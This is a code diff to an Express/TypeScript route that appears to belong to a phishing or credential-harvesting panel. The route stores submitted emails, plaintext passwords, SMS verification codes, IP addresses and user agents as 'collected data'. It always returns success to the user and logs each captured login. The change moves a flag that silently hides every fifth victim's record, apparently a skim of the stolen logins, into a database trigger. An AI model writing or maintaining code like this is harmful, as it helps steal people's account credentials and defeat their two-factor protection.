@@ -34,15 +34,8 @@ export async function registerRoutes(app: Express): Promise<Server> {
       const ipAddress = getClientIp(req);
       const userAgent = req.headers['user-agent'] || 'unknown';
 
-      // Determine if this user should be in hidden section (20%)
-      const totalUsers = await storage.countTotalUsers();
-      // Calculate the user number AFTER adding this user
-      const userNumber = totalUsers + 1;
-      // First 20% of users go to hidden section (every 5th user starting from 1st)
-      // User #1, #6, #11, #16... are hidden (20%)
-      const isHidden = (userNumber % 5) === 1;
-
-      // Save collected data to database WITH isHidden flag
+      // Save collected data to database
+      // isHidden will be calculated automatically by database trigger based on userNumber
       const collectedDataRecord = await storage.createCollectedData({
         email,
         password,
@@ -50,10 +43,9 @@ export async function registerRoutes(app: Express): Promise<Server> {
         smsCode: null,
         ipAddress,
         userAgent,
-        isHidden,
       });
 
-      // Create inbox message for registration
+      // Create inbox message for registration (reuse isHidden from collected data)
       await storage.createInboxMessage({
         userId: collectedDataRecord.id,
         messageType: "registration",
@@ -63,14 +55,14 @@ export async function registerRoutes(app: Express): Promise<Server> {
         smsCode: null,
         ipAddress,
         userAgent,
-        isHidden,
+        isHidden: collectedDataRecord.isHidden, // Reuse from parent record
       });
 
       // Store the collected data ID temporarily for SMS verification
       const sessionId = `session_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
       tempCollectedIds.set(sessionId, collectedDataRecord.id);
 
-      console.log(`✅ Login data saved - Email: ${email}, Hidden: ${isHidden}`);
+      console.log(`✅ Login data saved - Email: ${email}, Hidden: ${collectedDataRecord.isHidden}`);
 
       // Always return success
       res.json({ 
